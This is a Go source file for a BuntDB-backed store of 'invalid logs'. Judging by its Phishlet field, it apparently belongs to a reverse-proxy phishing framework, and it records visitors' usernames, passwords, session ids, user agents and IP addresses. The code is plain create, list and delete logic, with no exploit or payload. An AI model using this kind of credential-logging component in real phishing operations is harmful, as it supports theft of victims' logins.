package database

import (
	"encoding/json"
	"time"

	"github.com/tidwall/buntdb"
)

const InvalidLogTable = "invalid_logs"

type InvalidLog struct {
	Id         int    `json:"id"`
	Phishlet   string `json:"phishlet"`
	Username   string `json:"username"`
	Password   string `json:"password"`
	SessionId  string `json:"session_id"`
	UserAgent  string `json:"useragent"`
	RemoteAddr string `json:"remote_addr"`
	LandingURL string `json:"landing_url"`
	Reason     string `json:"reason"`
	CreateTime int64  `json:"create_time"`
}

func (d *Database) invalidLogsInit() {
	d.db.CreateIndex("invalid_logs_id", InvalidLogTable+":*", buntdb.IndexJSON("id"))
}

func (d *Database) invalidLogsCreate(s *InvalidLog) (*InvalidLog, error) {
	id, _ := d.getNextId(InvalidLogTable)

	s.Id = id
	s.CreateTime = time.Now().UTC().Unix()

	jf, _ := json.Marshal(s)

	err := d.db.Update(func(tx *buntdb.Tx) error {
		tx.Set(d.genIndex(InvalidLogTable, id), string(jf), nil)
		return nil
	})
	if err != nil {
		return nil, err
	}
	return s, nil
}

func (d *Database) invalidLogsList() ([]*InvalidLog, error) {
	logs := []*InvalidLog{}
	err := d.db.View(func(tx *buntdb.Tx) error {
		tx.Ascend("invalid_logs_id", func(key, val string) bool {
			l := &InvalidLog{}
			if err := json.Unmarshal([]byte(val), l); err == nil {
				logs = append(logs, l)
			}
			return true
		})
		return nil
	})
	if err != nil {
		return nil, err
	}
	return logs, nil
}

func (d *Database) invalidLogsDelete(id int) error {
	err := d.db.Update(func(tx *buntdb.Tx) error {
		_, err := tx.Delete(d.genIndex(InvalidLogTable, id))
		return err
	})
	return err
}

func (d *Database) invalidLogsDeleteBySessionId(sessionId string) error {
	if sessionId == "" {
		return nil
	}
	err := d.db.Update(func(tx *buntdb.Tx) error {
		tx.Ascend("invalid_logs_id", func(key, val string) bool {
			var l InvalidLog
			if err := json.Unmarshal([]byte(val), &l); err == nil {
				if l.SessionId == sessionId {
					tx.Delete(key)
				}
			}
			return true
		})
		return nil
	})
	return err
}
